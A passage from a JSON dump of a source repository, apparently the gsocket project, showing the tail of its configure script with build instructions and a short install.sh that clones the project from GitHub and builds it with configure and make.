--prefix=\\$HOME/usr --enable-static                *\n* gsocket-src> make all install                                              *\n* gsocket-src> export PATH=\\$HOME/usr/bin:\\$PATH                               *\n******************************************************************************\n\"\n\t\t;;\n\tesac\nfi\n\necho \"\n${PACKAGE_NAME}-${PACKAGE_VERSION} has been configured:\n\n Host..............: ${host}\n Prefix............: ${prefix}\n Compiler..........: ${CC}\n Compiler flags....: ${CFLAGS_STATIC}${CFLAGS}\n Preprocessor flags: ${CPPFLAGS}\n Linker flags......: ${LDFLAGS}\n Libraries.........: ${LIBS}\n\nConfiguration complete. Now type: make all install\"\nif test x\"${ARDIRWARN}\" = x1; then\n\tAC_MSG_WARN([Build tools seem to be a mix of GNU and Apple.])\n\tAC_MSG_WARN([Alex, try 'PATH=/usr/bin:\\$PATH ./configure'.])\nfi\n\n"
        },
        {
          "name": "deploy",
          "type": "tree",
          "content": null
        },
        {
          "name": "examples",
          "type": "tree",
          "content": null
        },
        {
          "name": "include",
          "type": "tree",
          "content": null
        },
        {
          "name": "install.sh",
          "type": "blob",
          "size": 0.3681640625,
          "content": "#! /usr/bin/env bash\n\n## This script lives at https://gsocket.io/install.sh)\n\ncommand -v git >/dev/null 2>&1 || { echo >&2 \"git not found. Try 'apt-get install git'\"; exit 1; }\ngit clone --depth 1 https://github.com/hackerschoice/gsocket.git || exit\n( cd gsocket \\\n&& ./bootstrap \\\n&& ./configure && make && echo -e \"\\n---> Type 'cd gsocket; sudo make install' to install.\" )\n\n"
        },
        {
          "name": "lib",
          "type": "tree",
          "content": null
        },
        {
          "name": "man",
          "type": "tree",
          "content": null
        },
        {
          "name": "packaging",
          "type": "tree",
          "content": null
        },
        {
          "name": "test-build",
          "type": "tree",
          "content": null
        },
        {
          "name": "tests",
          "type": "tree",
          "content": null
        },
        {
          "name": "tools",
          "type": "tree",
          "content": null
        }
      ]
    }
  ]
}